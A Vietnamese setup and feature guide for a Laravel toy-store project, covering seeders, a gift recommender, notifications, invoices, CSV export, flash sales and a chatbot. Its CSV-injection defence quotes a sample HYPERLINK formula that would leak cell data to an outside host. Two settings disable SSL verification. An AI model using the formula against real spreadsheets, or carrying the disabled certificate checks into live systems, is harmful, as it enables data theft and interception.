# ToyLand — Hướng dẫn cài đặt & tổng hợp chức năng

Dự án: Website thương mại điện tử bán đồ chơi trẻ em (Laravel 8 + SQL Server).

---

## 0. CẬP NHẬT BẢN MỚI NHẤT (chạy sau khi lấy code về)

Nếu database đã có dữ liệu và bạn **không muốn mất đơn hàng đã test**:

```bash
php artisan migrate
php artisan db:seed --class=ToyCatalogSeeder
php artisan cache:clear
php artisan view:clear
php artisan config:clear
```

- `migrate` chỉ thêm cột mới (danh mục cha-con, thông số sản phẩm, tỉnh/quận/phường cho sổ địa chỉ), không xóa gì.
- `ToyCatalogSeeder` dùng `firstOrCreate`/`updateOrCreate` theo **tên**, chạy lại bao nhiêu lần cũng không nhân bản dữ liệu.
- `cache:clear` là bước **bắt buộc sau khi seed**: chatbot lưu tạm danh sách hãng và
  nhân vật trong 10 phút, không xóa cache thì bot chưa nhận ra hàng mới nhập.

## 0c. ĐỢT NÂNG CẤP: HỒ SƠ CỦA BÉ & SỔ SINH NHẬT

### Ý tưởng

Web đồ chơi có một điều kỳ lạ: **người trả tiền không phải người chơi**. Bố mẹ
mua, con chơi. Mọi bộ lọc trên trang chủ đều bắt bố mẹ tự dịch "con mình" thành
"nhóm 3-6 tuổi, bé gái, thích công chúa" — mỗi lần mua là dịch lại một lần.

Hồ sơ của bé lật ngược chuyện đó: khai **một lần** tên + ngày sinh + sở thích,
sau đó hệ thống tự dịch. Và vì đã có ngày sinh, nó biết trước sinh nhật.

### Khách hàng dùng thế nào

| Nơi | Có gì |
|---|---|
| Thanh điều hướng | Ô **chọn bé** — đổi bé là trang chủ đổi theo, có 🎂 khi sắp sinh nhật |
| `/be-yeu` | Danh sách hồ sơ, mỗi bé kèm 4 món hợp tuổi |
| `/be-yeu/so-sinh-nhat` | **Sổ sinh nhật** — đếm ngược + gợi ý quà |
| Trang chủ | Khối *"Hợp với \<tên bé\>"* khi đã chọn bé |
| Chatbot | Gõ *"gợi ý quà sinh nhật cho con"* là bot tra hồ sơ trả lời |

### Điểm cốt lõi: gợi ý theo tuổi bé SẮP TRÒN

Trang hồ sơ gợi ý theo tuổi **hiện tại**. Sổ sinh nhật gợi ý theo tuổi bé
**sắp tròn** (`ChildProfile::$gift_age_months`).

Bé sắp lên 6 mà tặng đồ của tuổi 5 thì món quà lỗi thời ngay trong tháng đầu —
quà sinh nhật phải chơi được suốt năm sau đó.

### Bộ chấm điểm — `GiftFinderService`

Khác hẳn `RecommendationService`:

| | RecommendationService | GiftFinderService |
|---|---|---|
| Trả lời | "ai mua A cũng mua B" | "bé 5 tuổi thích Spider-Man hợp món nào" |
| Học từ | lịch sử mua của cả shop | đặc điểm của đứa trẻ |
| Cần dữ liệu | hàng trăm đơn | **không cần đơn nào** |

Công thức cộng các tín hiệu độc lập:

```
Độ tuổi       0 .. 5.0    đúng khoảng 5.0 · lệch ≤6th 3.0 · ≤12th 1.5 · ≤24th 0.5
Nhân vật      0 .. 3.0    khớp character_name, cộng thêm 1.5 nếu tên món có chứa
Danh mục      0 .. 2.0    danh mục con khớp 2.0 · cùng danh mục cha 1.2
Giới tính  -1.5 .. 1.5    khớp +1.5 · trung tính +0.4 · LỆCH HẲN −1.5
Độ phổ biến   0 .. 1.0    sold_quantity chuẩn hóa
Nổi bật       0 .. 0.5
```

Kết quả đo được (bé gái 5 tuổi, thích Spider-Man):

```
Đúng tuổi, trung tính            5.40
Đúng tuổi + nhân vật khớp        8.40
Đúng tuổi + đúng giới tính       6.50
Đúng tuổi + SAI giới tính        3.50
SAI tuổi + nhân vật khớp         3.40   <- vẫn THUA "đúng tuổi, trung tính"
Trọn bộ                         11.00
```

Dòng áp chót là chủ ý: **tuổi luôn thắng sở thích**. Bé 5 tuổi mê Spider-Man
vẫn không được gợi ý mô hình 12+ — đồ chơi sai tuổi là đồ chơi hỏng, và với
chi tiết nhỏ thì còn là vấn đề an toàn.

### Nhắc sinh nhật qua email

```bash
php artisan toyland:birthday-reminder --dry-run   # xem sẽ gửi cho ai, KHÔNG gửi
php artisan toyland:birthday-reminder             # gửi thật
php artisan toyland:birthday-reminder --days=7    # đổi mốc nhắc
```

Lệnh chỉ gửi cho bé có sinh nhật **đúng N ngày nữa**, không phải "trong vòng N
ngày" — gửi cả khoảng thì mỗi ngày bố mẹ lại nhận một email cho cùng một bé.

Chạy tự động: đã khai trong `app/Console/Kernel.php` lúc 8h sáng. Muốn nó chạy
thật thì bật `php artisan schedule:work` (hoặc cron gọi `schedule:run` mỗi phút).
Không bật cũng không sao, gửi tay bằng lệnh trên.

### Phía quản trị

**Phân tích → Sổ sinh nhật**: danh sách bé sắp sinh nhật của *toàn bộ* khách
hàng, kèm email phụ huynh và sở thích của bé. Đây là danh sách chăm sóc khách
có sẵn, không phải đoán. Kèm biểu đồ sinh nhật theo tháng để biết mùa nào đông.

### Bảo mật

Mọi thao tác trên hồ sơ bé đi qua `ChildProfileController::owned()`, hàm này
**luôn** lọc `where('user_id', Auth::id())` rồi mới `findOrFail`. Đổi id trên URL
chỉ nhận 404 chứ không xem được hồ sơ con nhà người khác.

Bé đang chọn lưu ở **session**, và khi đọc ra vẫn lọc lại trong tập hồ sơ của
chính tài khoản đó — session bị chỉnh tay cũng không lấy được dữ liệu người khác.

---

## 0d. ĐỢT NÂNG CẤP: VẬN HÀNH (nhịp A)

### Chuông thông báo

Chuông ở thanh điều hướng, chấm đỏ đếm số chưa đọc, tự cập nhật mỗi 60 giây.
Trang đầy đủ ở `/thong-bao`.

Thông báo được tạo tự động ở bốn chỗ:

| Khi nào | Ai nhận |
|---|---|
| Khách đặt hàng xong | Khách + **toàn bộ quản trị viên** |
| Admin đổi trạng thái đơn | Khách, kèm câu mô tả riêng cho từng trạng thái |
| Lệnh nhắc sinh nhật chạy | Phụ huynh |

**Vì sao cần, khi đã có email:** email phụ thuộc SMTP, mà ở đồ án này chỉ cần
sai `MAIL_PASSWORD` là cả luồng thông báo tắt ngấm. Thông báo trong ứng dụng ghi
thẳng vào CSDL nên chắc chắn tới nơi. Trong `BirthdayReminderCommand`, thông báo
được tạo **trước** khi gửi email đúng vì lý do đó.

`UserNotification::push()` **không bao giờ ném lỗi ra ngoài** — nó được gọi xen
giữa việc đặt hàng, mà thông báo hỏng thì không được phép làm hỏng đơn hàng.

Mỗi tài khoản chỉ giữ 50 thông báo mới nhất (`KEEP_PER_USER`), tự dọn khi có cái
mới — bảng không phình mãi.

> Bảng tên `user_notifications` chứ không phải `notifications`: Laravel có sẵn hệ
> thống Notification dùng đúng tên đó, đặt khác là tránh hẳn va chạm.

### Hóa đơn PDF

Nút **In hóa đơn** ở trang chi tiết đơn, cả phía khách lẫn phía admin.

Không dùng thư viện sinh PDF (dompdf, mPDF): cài là phải `composer install` —
bước hay hỏng nhất trên Laragon offline. Thay vào đó là HTML tối ưu cho in, bấm
nút là mở hộp thoại in, chọn *"Lưu thành PDF"* ra file đúng chuẩn, chữ Việt
không lỗi phông, chọn được khổ giấy.

Khối `@media print` ẩn hết nút bấm, bỏ nền và đổ bóng, ép khổ A4 lề 14mm.

Hóa đơn dùng **chung một file Blade** cho cả hai phía; dữ liệu do
`OrderController::invoiceData()` dựng — sửa một lần là đúng cả hai chỗ.

Tạm tính được dựng lại từ `order_items` chứ không lấy `total_price` trừ ngược,
vì giá trong `order_items` là giá **tại thời điểm mua** — in lại hóa đơn cũ vẫn
khớp số tiền khách đã trả dù sản phẩm đã đổi giá.

### Xuất Excel

**Quản trị → Xuất dữ liệu**, bốn báo cáo: đơn hàng (lọc theo trạng thái và
khoảng ngày), doanh thu theo ngày, tồn kho, khách hàng.

Xuất CSV chứ không phải .xlsx vì file .xlsx thật cần PhpSpreadsheet, tức là lại
`composer install`. CSV thì PHP tự ghi, Excel mở thành bảng bình thường.

Nhưng CSV tiếng Việt có **hai cái bẫy**, `CsvExportService` xử lý cả hai:

1. **Lỗi phông.** Excel đọc CSV theo bảng mã hệ thống (Windows-1258 ở máy Việt
   Nam) nên "Đồ chơi" thành `Ä?á»" chÆ¡i`. Chữa bằng **BOM UTF-8** (3 byte
   `EF BB BF`) ở đầu file.
2. **Dồn hết vào một cột.** Windows tiếng Việt đặt dấu phân cách danh sách là
   dấu **chấm phẩy**, nên file ngăn bằng dấu phẩy bị nhét hết vào cột A. Chữa
   bằng dòng `sep=,` ở đầu file — Excel đọc rồi tự ẩn dòng đó đi.

Thêm một lớp nữa: **chống CSV injection**. Ô bắt đầu bằng `=` `+` `-` `@` được
Excel hiểu là *công thức*. Ai đó đặt tên sản phẩm là
`=HYPERLINK("http://xau.vn?"&A1,"Bấm vào đây")` rồi chờ admin xuất file và bấm
nhầm là dữ liệu bay đi. Mỗi ô như vậy được thêm một dấu nháy đơn ở đầu.

Dữ liệu đọc theo từng khối 500 bản ghi (`ExportController::stream()`), phân
trang bằng `id > lần cuối` chứ không dùng `OFFSET`. Cố ý **không** dùng
`cursor()`: nó không nạp sẵn quan hệ nên xuất 5.000 đơn thành 5.001 truy vấn.

---

### Phân quyền & trang lỗi

Khu quản trị chặn bằng `middleware(['auth', 'admin'])`. `AdminMiddleware`
**chuyển hướng** chứ không `abort(403)`:

| Ai | Đi đâu |
|---|---|
| Chưa đăng nhập | Trang đăng nhập, kèm lời nhắc |
| Đã đăng nhập, không phải admin | Trang chủ, kèm lời nhắc |
| Gọi bằng AJAX | JSON mã 401 / 403 (JavaScript cần mã lỗi, không cần trang HTML) |

**Vòng lặp đã sửa:** khách chưa đăng nhập bấm nhầm link `/admin` → middleware
`auth` lưu `/admin` làm *nơi định vào* rồi đẩy về trang đăng nhập → đăng nhập
xong `redirect()->intended()` lại ném họ về `/admin` → bị chặn tiếp. Vừa đăng
nhập xong đã thấy bị từ chối, rất khó hiểu. Nay cả `AdminMiddleware` lẫn
`AuthController::login()` đều xóa `url.intended` khi nó trỏ vào khu quản trị.

So khớp bằng **đường dẫn** chứ không phải chuỗi con — dùng `strpos` đơn thuần
thì sản phẩm tên `/san-pham/bo-do-choi-admin` cũng bị tính là khu quản trị.

Trang lỗi riêng ở `resources/views/errors/`: **403, 404, 419, 429, 500, 503**.
Chúng **cố ý không dùng `layouts.user`**: layout đó cần truy vấn CSDL cho giỏ
hàng, chuông thông báo, khung chat — mà trang 500 thường xảy ra *chính vì* CSDL
có vấn đề. Trang lỗi chỉ nạp CSS tĩnh nên luôn hiển thị được.

---

## 0e. ĐỢT NÂNG CẤP: VẬN HÀNH (nhịp B)

### Nhiều ảnh mỗi sản phẩm

Bảng mới `product_images`. Cột `products.image` **giữ nguyên** làm ảnh đại diện —
thứ hiện ở danh sách, giỏ hàng, hóa đơn, email. Bảng mới chỉ chứa ảnh phụ.

Dồn hết vào bảng mới rồi bỏ cột cũ nghe thì gọn, nhưng cả chục chỗ đang đọc
`products.image` trực tiếp; đổi hết là cuộc phẫu thuật lớn mà giá trị thêm gần
bằng không.

Trang chi tiết có thư viện ảnh: bấm hoặc rê chuột lên ảnh nhỏ là đổi ảnh lớn.
Ảnh được nạp trước nên lần bấm đầu không khựng. Chỉ một ảnh thì không hiện dãy
ảnh nhỏ.

Phía quản trị chọn nhiều file cùng lúc (tối đa 8), xóa từng ảnh bằng nút ✕.
Form xóa ảnh đặt **ngoài** form sản phẩm và nối vào bằng thuộc tính `form="..."`,
vì HTML cấm lồng form trong form.

### Flash sale đếm ngược

Ba cột mới trên `products`: `sale_price`, `sale_starts_at`, `sale_ends_at`.
Không sửa thẳng `products.price` — sửa là mất giá gốc, hết sale không biết trả
về bao nhiêu, và cũng không hiện được giá gạch ngang.

`Product::$is_on_sale` đòi **ba điều kiện cùng đúng**: có `sale_price` và nó
*thật sự rẻ hơn* giá gốc, đã tới giờ bắt đầu, chưa qua giờ kết thúc. Điều kiện
giữa là lớp chặn cuối — admin lỡ gõ giá khuyến mãi cao hơn giá gốc thì hệ thống
lặng lẽ bán giá thường chứ không bán đắt hơn cho khách đang tưởng mình được giảm.

**`Product::$effective_price` là con số DUY NHẤT được dùng để tính tiền.** Mọi
nơi đều gọi nó, không nơi nào đọc thẳng `->price`.

#### Chỗ khó nhất: giá trong giỏ hàng

Giỏ hàng nằm trong session, mỗi dòng lưu kèm giá tại thời điểm bỏ vào giỏ. Mà
flash sale thì có khung giờ. Khách bỏ món vào giỏ lúc đang giảm giá rồi để đó
qua đêm — sáng hôm sau hết sale mà giỏ vẫn giữ giá cũ thì **shop bán lỗ**.

`CheckoutController::syncCartPrices()` đọc lại giá hiệu lực từ CSDL và ghi ngược
vào session, được gọi ở đầu cả trang giỏ hàng, trang thanh toán lẫn lúc đặt hàng.

Vẫn còn một khe hở: từ lúc hiện trang thanh toán tới lúc bấm Đặt hàng có thể
trôi qua vài phút, đủ để một đợt sale kết thúc. Nên trong giao dịch, trên bản
ghi **đã khóa**, hệ thống chốt giá lần cuối:

```php
if ((int) $product->effective_price !== (int) $item['price']) {
    throw new RuntimeException("Giá của ... vừa thay đổi ...");
}
```

Nguyên tắc: **không bao giờ thu của khách một mức giá mà họ chưa từng được xem.**

#### Múi giờ — bắt buộc phải là `Asia/Ho_Chi_Minh`

`config/app.php` phải đặt `'timezone' => 'Asia/Ho_Chi_Minh'`. Đây **không phải**
chuyện thẩm mỹ.

Ô `<input type="datetime-local">` gửi lên một chuỗi **không kèm múi giờ**: admin
gõ `14:00` thì server nhận đúng chuỗi `14:00`. Ứng dụng chạy UTC thì Laravel
hiểu đó là 14:00 giờ UTC, trong khi `now()` lúc 14:00 giờ Việt Nam mới là
07:00 UTC.

Kết quả: đặt sale bắt đầu 14:00, tới 14:00 chương trình **không chạy**, phải đợi
thêm 7 tiếng. Nhìn giao diện không tài nào thấy được.

Sửa xong nhớ `php artisan config:clear`.

#### Đồng hồ đếm ngược

Server gửi **số giây còn lại**, không gửi mốc thời gian tuyệt đối. Gửi mốc rồi
để JavaScript so với đồng hồ máy khách thì máy đặt sai giờ sẽ đếm ngược sai, có
khi ra số âm. Gửi số giây thì chỉ phụ thuộc vào việc máy đo được *khoảng* thời
gian trôi qua — thứ máy nào cũng đúng.

#### Lệnh soi lỗi

```bash
php artisan flashsale:check          # chỉ món có khai khuyến mãi
php artisan flashsale:check --all    # tất cả sản phẩm
```

In ra ba cái đồng hồ (ứng dụng / PHP / CSDL) cạnh nhau, rồi bảng từng sản phẩm
kèm **cột "Lý do"** giải thích vì sao món đó đang chạy hay không: chưa khai giá,
giá sale không rẻ hơn giá gốc, chưa tới giờ, đã hết giờ, hay hết hàng.

### So sánh sản phẩm

Nút ⚖ trên mỗi thẻ sản phẩm, tối đa 4 món (quá 4 là tràn màn hình điện thoại).
Danh sách nằm trong **session** nên khách vãng lai cũng dùng được — đây là thao
tác nhất thời, không ai muốn xem lại danh sách so sánh của tuần trước.

Thanh nổi ở đáy màn hình hiện số món đang chọn. Bảng so sánh có 18 hàng thông số.

Chi tiết đáng chú ý: **hàng nào mọi sản phẩm đều giống nhau thì bị làm mờ**.
Mắt người chỉ cần nhìn vào chỗ khác nhau; bảng 18 hàng mà hàng nào cũng đậm như
nhau thì đọc rất mệt.

---

### Kho dữ liệu mẫu

| | Số lượng |
|---|---|
| Danh mục cha | 11 |
| Danh mục con | 44 |
| Sản phẩm | **397** (8-9 món mỗi danh mục con) |
| Nhân vật cho bộ lọc | **45** |

Dữ liệu nằm ở hai file, cùng một định dạng dòng:

- `database/seeders/ToyCatalogSeeder.php` — **logic**: dựng cây danh mục, ghi sản
  phẩm, chống trùng. Kèm bộ dữ liệu ban đầu.
- `database/seeders/ToyCatalogExtra.php` — **thuần dữ liệu**, tách riêng cho dễ sửa.

Muốn thêm sản phẩm thì mở `ToyCatalogExtra.php`, chép một dòng bất kỳ rồi sửa.
Bắt buộc có: `category` (phải đúng tên một danh mục con), `name` (là khóa chống
trùng, đặt tên trùng sẽ GHI ĐÈ món cũ chứ không thêm mới), `brand`, `price`,
`qty`, `age_min`, `age_max`, `desc`.

Tên nhân vật (`character`) phải viết **thống nhất** giữa các sản phẩm — `Spider-Man`
lúc này, `Spiderman` lúc khác sẽ thành hai lựa chọn riêng trong bộ lọc.

Nếu muốn làm sạch hoàn toàn:

```bash
php artisan migrate:fresh --seed
```

### Những gì bản này thêm vào

| Nội dung | Chi tiết |
|---|---|
| Ảnh sản phẩm | Upload ghi thẳng vào `public/uploads/` — **không cần `php artisan storage:link`** nữa |
| Danh mục | 10 nhóm cha × 4 nhóm con = 40 danh mục (tham chiếu MyKingdom) |
| Sản phẩm mẫu | ~100 món, mỗi nhóm cha khoảng 10 món |
| Thông số sản phẩm | SKU, nhân vật/chủ đề, tuổi theo tháng, kỹ năng, số chi tiết, pin, kích thước, cân nặng, bảo hành, lưu ý an toàn |
| Bộ lọc trang chủ | Nhóm đồ chơi → nhóm con → độ tuổi / hãng / nhân vật / giới tính / khoảng giá |
| Trang `/danh-muc` | Đã bỏ (tự chuyển về trang chủ) — danh mục nằm ở menu và bộ lọc |
| Sổ địa chỉ | Lưu kèm Tỉnh/Quận/Phường nên lần sau đặt hàng tính phí ship ngay |

---

## 0b. ĐỢT NÂNG CẤP: CHATBOT + BỘ GỢI Ý

```bash
php artisan migrate
php artisan view:clear
php artisan config:clear
php artisan chatbot:test        # kiểm chứng độ chính xác của bot
```

### Chatbot

Khung chat ở góc dưới bên phải giờ có **hai chế độ**:

| Chế độ | Ai dùng được | Làm gì |
|---|---|---|
| **Trợ lý** | cả khách chưa đăng nhập | trả lời ngay, truy vấn CSDL thật |
| **Nhân viên** | phải đăng nhập | chat trực tiếp với admin (chức năng cũ) |

Bot hiểu **14 ý định** và bóc tách được tuổi, ngân sách, giới tính, nhân vật,
thương hiệu, danh mục, mã đơn từ câu nói tự nhiên. Thử gõ:

- `tìm quà cho bé gái 5 tuổi tầm 300k`
- `đơn hàng #12 tới đâu rồi`
- `có mã giảm giá nào đang chạy không`
- `bé 8 tháng chơi gì được`

Mọi con số (giá, tồn kho, trạng thái đơn, mã giảm giá) đều đọc trực tiếp từ CSDL
tại thời điểm hỏi — bot **không** có câu trả lời viết cứng về số liệu.

**Trang quản trị → Phân tích → Chatbot** có mục *"Bot chưa trả lời được"*: đó là
danh sách câu khách hỏi mà bot chịu thua. Thêm chúng vào **Câu hỏi thường gặp**
là lần sau bot tự trả lời được, không cần sửa code.

### Bật LLM bổ trợ (TÙY CHỌN)

Bot chạy **hoàn toàn offline** và đầy đủ chức năng mà không cần khai gì. Nếu muốn
bot đỡ thêm những câu tán gẫu ngoài kịch bản, thêm vào `.env`:

```
CHATBOT_LLM_DRIVER=openai        # none | openai | gemini
CHATBOT_LLM_KEY=sk-...
CHATBOT_LLM_MODEL=gpt-4o-mini    # hoặc gemini-1.5-flash
CHATBOT_LLM_BASE_URL=https://api.openai.com/v1
CHATBOT_LLM_TIMEOUT=45           # giây; model chạy trên máy cần nhiều hơn
CHATBOT_LLM_VERIFY_SSL=false     # đặt false nếu Laragon báo lỗi chứng chỉ
```

LLM chỉ được gọi khi bot nội bộ **không hiểu** câu hỏi, và bị ràng buộc không
được bịa giá / tồn kho / trạng thái đơn.

#### Dùng model chạy trên máy mình (Ollama / LM Studio) — KHÔNG mất phí

Ollama dựng sẵn một cổng API **giống hệt chuẩn OpenAI**, nên vẫn để
`DRIVER=openai`, chỉ đổi địa chỉ gọi:

```
CHATBOT_LLM_DRIVER=openai
CHATBOT_LLM_KEY=ollama                          # Ollama không kiểm tra, điền gì cũng được
CHATBOT_LLM_MODEL=qwen2.5:7b                    # tên phải khớp `ollama list`
CHATBOT_LLM_BASE_URL=http://localhost:11434/v1  # ĐÚNG tên biến là BASE_URL
CHATBOT_LLM_TIMEOUT=60
```

Ba chỗ hay sai:

| Sai | Đúng |
|---|---|
| `OPENAI_BASE_URI=...` | `CHATBOT_LLM_BASE_URL=...` (vẫn đọc được tên cũ, nhưng nên dùng tên đúng) |
| `http://localhost:11434` | `http://localhost:11434/v1` — **thiếu `/v1` là 404** |
| `qwen2.5-coder` | Model *coder* được huấn luyện để viết code, trả lời tiếng Việt kém. Dùng `qwen2.5:7b` hoặc `llama3.1:8b` |

Sửa `.env` xong **bắt buộc** chạy `php artisan config:clear`.

### Vì sao bot không được phép "tự nghĩ ra" sản phẩm

LLM **không truy cập CSDL**, nên nếu để nó trả lời câu hỏi mua hàng thì nó sẽ
nghĩ ra một cái tên nghe rất thật — kèm giá — mà kho không hề có. Hệ thống chặn
điều đó bằng ba lớp:

1. **Từ khóa** — nhóm `product_search` có bộ từ khóa rộng nhất.
2. **Thực thể làm bằng chứng** — nếu từ khóa bó tay nhưng câu hỏi lại bóc được
   tuổi / giá / giới tính / hãng / nhân vật, hệ thống *vẫn* chuyển sang tìm hàng
   thật. Ba dữ kiện đó chỉ có nghĩa khi người ta đang chọn đồ chơi.
   Xem `ChatbotService::boostWithEntities()`.
3. **Lưới an toàn ở LLM** — prompt cấm LLM nêu tên sản phẩm cụ thể, và mọi câu
   trả lời của LLM đều được đính kèm thẻ sản phẩm **tìm thật trong kho** theo từ
   khóa của khách. Xem `ChatbotService::searchByKeyword()`.

Mọi thẻ sản phẩm trong khung chat đều là liên kết tới `/san-pham/{id}`.

### Bộ gợi ý

Khối *"Khách mua món này cũng mua"* và *"Gợi ý riêng cho bạn"* nay chạy bằng
**lọc cộng tác**: đếm số đơn chứa đồng thời hai sản phẩm rồi chuẩn hóa bằng cosine

```
                    |đơn chứa cả A và B|
    sim(A,B) = ─────────────────────────────
               √|đơn chứa A| × √|đơn chứa B|
```

Chia cho căn độ phổ biến để món bán chạy không chiếm hết mọi ô gợi ý.

Khi shop chưa đủ đơn để học (*cold start*), hệ thống tự chuyển sang **gợi ý theo
nội dung**: chấm điểm theo cùng danh mục, khoảng tuổi giao nhau, cùng nhân vật,
cùng hãng, giá gần nhau. Lệnh `php artisan chatbot:test` cho biết đang chạy ở chế độ nào.

### Lệnh kiểm chứng

```bash
php artisan chatbot:test          # chạy 42 ca kiểm thử ý định + bóc tách thực thể
php artisan chatbot:test --chat   # trò chuyện thử ngay trong terminal
php artisan chatbot:doctor        # dò lỗi khi khung chat báo "đang gặp trục trặc"
php artisan chatbot:doctor --fix-hint
```

### Khi khung chat báo "Mình đang gặp trục trặc"

Câu đó là thông báo chung của trình duyệt; lỗi thật nằm ở máy chủ. Chạy:

```bash
php artisan chatbot:doctor
```

Lệnh đi từ nền móng lên — kết nối CSDL → các bảng → ghi hội thoại → chạy thử
**từng nhóm câu hỏi** → gọi thử LLM — và in ra nguyên văn lỗi kèm **tên file và
số dòng**. Hỏng ở tầng nào thì đọc ở tầng đó.

Hai nguyên nhân thường gặp nhất:

1. **Chưa chạy `php artisan migrate`** → thiếu bảng `chat_conversations`.
   Từ bản này, thiếu bảng thì bot **vẫn trả lời**, chỉ là không lưu được lịch sử.
2. **Khai LLM sai** → xem bảng "ba chỗ hay sai" ở mục Ollama phía trên.

Khi `APP_DEBUG=true`, lỗi cũng được in thẳng vào khung chat dưới dạng dòng chữ
nhỏ bắt đầu bằng `⚠`, và ghi vào Console của trình duyệt (F12).

---

## 1. CÁC BƯỚC CHẠY LẦN ĐẦU

### Bước 1 — Đổi tên thư mục dự án

Đóng Laragon, đổi tên thư mục trong File Explorer:

```
C:\laragon\www\tpcn   →   C:\laragon\www\toys_storee
```

Mở lại Laragon. Địa chỉ web mới: `http://toys_storee.test` (hoặc `http://localhost/toys_storee/public`).

### Bước 2 — Tạo database mới

Mở SQL Server Management Studio và chạy:

```sql
CREATE DATABASE toys_storee;
```

### Bước 3 — Sửa file `.env`

```
APP_NAME=ToyLand
DB_DATABASE=toys_storee
```

Nếu muốn dùng đăng nhập Google, thêm 3 dòng (lấy tại https://console.cloud.google.com/apis/credentials):

```
GOOGLE_CLIENT_ID=...
GOOGLE_CLIENT_SECRET=...
GOOGLE_REDIRECT_URI=http://toys_storee.test/auth/google/callback
GOOGLE_VERIFY_SSL=false
```

> Không khai 3 biến này thì nút "Đăng nhập bằng Google" vẫn hiện nhưng sẽ báo "chưa được cấu hình" — các chức năng còn lại không ảnh hưởng.

### Bước 4 — Dựng lại database và nạp dữ liệu mẫu

```bash
php artisan config:clear
php artisan cache:clear
php artisan view:clear
composer dump-autoload
php artisan migrate:fresh --seed
```

> Không cần `php artisan storage:link` nữa: ảnh tải lên được ghi thẳng vào `public/uploads/`.
> Lệnh này trên Windows đòi quyền Administrator để tạo symbolic link, đó chính là lý do
> trước đây upload xong mà ảnh vẫn hiện icon vỡ. Ảnh cũ (nếu có) vẫn hiển thị bình thường.

### Bước 5 — Dọn file rác (tùy chọn)

Xóa 3 file còn sót trong thư mục gốc: `lab07.md`, `lab08.md`, `tk.md`.

### Bước 6 — Tài khoản mặc định

Xem trong `database/seeders/AdminUserSeeder.php` và `CustomerUserSeeder.php`.

---

## 2. CẤU TRÚC DỮ LIỆU SẢN PHẨM (sau khi đổi đề tài)

| Cột cũ (TPCN) | Cột mới (Đồ chơi) | Ví dụ |
|---|---|---|
| `dosage_form` (Dạng bào chế) | `age_range` — Độ tuổi phù hợp | "3-5 tuổi", "6+ tuổi", "0-12 tháng" |
| `packaging` (Quy cách đóng gói) | `material` — Chất liệu | "Nhựa ABS", "Gỗ tự nhiên", "Vải bông" |
| `expiry_date` (Hạn sử dụng) | `origin` — Xuất xứ | "Đan Mạch", "Nhật Bản", "Việt Nam" |
| — | `gender` — Phù hợp với (mới) | `boy` / `girl` / `unisex` |

Toàn bộ nghiệp vụ còn lại (xác thực, giỏ hàng, MoMo, GHN, đơn hàng, báo cáo, chat) giữ nguyên 100%.

---

## 3. TỔNG HỢP CHỨC NĂNG

### 3.1 Yêu cầu chính

| Yêu cầu | Trạng thái | Nơi thực hiện |
|---|---|---|
| Hiển thị chi tiết sản phẩm | ✅ | `/san-pham/{id}` |
| Hiển thị sản phẩm bán chạy | ✅ | Trang chủ + Dashboard + Báo cáo |
| Hệ thống danh mục | ✅ | `/danh-muc`, Admin → Danh mục |
| Bộ lọc | ✅ | Danh mục, độ tuổi, thương hiệu, giới tính, khoảng giá, còn hàng |
| Tìm kiếm từ khóa & thuộc tính | ✅ | Ô tìm kiếm trang chủ (tên, thương hiệu, chất liệu, xuất xứ, mô tả) |
| Quản lý tồn kho | ✅ | Trừ kho khi đặt (có khóa `lockForUpdate`), **hoàn kho khi hủy đơn** |
| Đăng ký / Đăng nhập / Xác thực email | ✅ | + Đăng nhập Google |
| Quản lý hồ sơ cá nhân | ✅ | `/tai-khoan` — thông tin, mật khẩu, sổ địa chỉ, điểm thưởng |
| Phân quyền | ✅ | `role` + middleware `admin` |
| Giỏ hàng | ✅ | Thêm/sửa/xóa, Mua ngay, kiểm tra tồn kho |
| Thanh toán | ✅ | COD + MoMo (ví/QR, ATM, thẻ quốc tế), IPN có xác thực HMAC |
| Theo dõi trạng thái đơn | ✅ | Timeline 5 bước + nhật ký trạng thái |
| Lịch sử đơn hàng | ✅ | `/orders` |
| **Admin xác nhận / hủy / cập nhật đơn** | ✅ | Admin → Đơn hàng → Xử lý |
| **Đánh giá & bình luận sản phẩm** | ✅ | Chỉ sau khi đơn giao thành công; admin ẩn/hiện/phản hồi |
| Thống kê doanh số | ✅ | Doanh thu ngày/tháng/năm, theo danh mục, theo phương thức, **Top 10 bán chạy** |

**Vòng đời đơn hàng:** Chờ xác nhận → Đã xác nhận → Đã đóng gói → Đang vận chuyển → Đã giao thành công.
Có thể Hủy ở mọi bước trước khi giao (tự động hoàn kho, không bao giờ hoàn 2 lần nhờ cột `restocked_at`).

### 3.2 Yêu cầu phụ

| Yêu cầu | Trạng thái | Đường dẫn |
|---|---|---|
| Lịch sử duyệt sản phẩm | ✅ | Khối "Bạn vừa xem" ở trang chủ (bảng `product_views`) |
| Gợi ý sản phẩm | ✅ | Khối "Gợi ý cho bạn" — dựa trên danh mục đã xem/đã mua |
| Danh sách yêu thích (Wishlist) | ✅ | `/yeu-thich` + nút trái tim trên mọi thẻ sản phẩm |
| Mã giảm giá / Voucher | ✅ | `/ma-giam-gia`, áp dụng ở trang thanh toán; Admin → Mã giảm giá |
| Khách hàng thân thiết | ✅ | Tích điểm + 4 hạng Đồng/Bạc/Vàng/Kim Cương, giảm 0/2/5/8% tự động |
| Email thông báo | ✅ | Email xác nhận đơn + email mỗi lần đổi trạng thái |
| FAQ | ✅ | `/cau-hoi-thuong-gap`; Admin → Câu hỏi thường gặp |
| Live Chat | ✅ | Khung chat góc phải (đã có từ Lab 07) |
| Hệ thống Ticket | ✅ | `/ho-tro`; Admin → Yêu cầu hỗ trợ |
| CMS trang tĩnh | ✅ | `/trang/{slug}`; Admin → Trang tĩnh |
| Blog / tin tức | ✅ | `/tin-tuc`; Admin → Bài viết |
| Tích hợp vận chuyển | ✅ | GHN — tra cứu địa chỉ + tính phí thật |
| Đăng nhập mạng xã hội | ✅ | Google OAuth 2.0 (không cần cài package ngoài) |
| Phân tích hành vi người dùng | ✅ | `product_views` + báo cáo doanh thu + Top bán chạy |

---

## 4. CÁCH TÍNH TIỀN MỘT ĐƠN HÀNG

```
Tạm tính           = Σ (giá × số lượng)
− Ưu đãi hạng      = Tạm tính × %hạng thành viên   (Đồng 0%, Bạc 2%, Vàng 5%, Kim Cương 8%)
− Mã giảm giá      = áp dụng trên phần còn lại (theo % có trần, hoặc số tiền cố định)
+ Phí vận chuyển   = GHN tính lại Ở SERVER tại thời điểm đặt hàng
─────────────────────────────────────────
= Tổng cộng
```

Điểm thưởng: mỗi **10.000đ** giá trị đơn **đã giao thành công** = **1 điểm**;
tổng chi tiêu (`lifetime_spent`) quyết định hạng thành viên.

---

## 5. CÁC BẢNG DỮ LIỆU MỚI

| Bảng | Mục đích |
|---|---|
| `order_status_logs` | Nhật ký chuyển trạng thái đơn hàng |
| `reviews` | Đánh giá & bình luận sản phẩm |
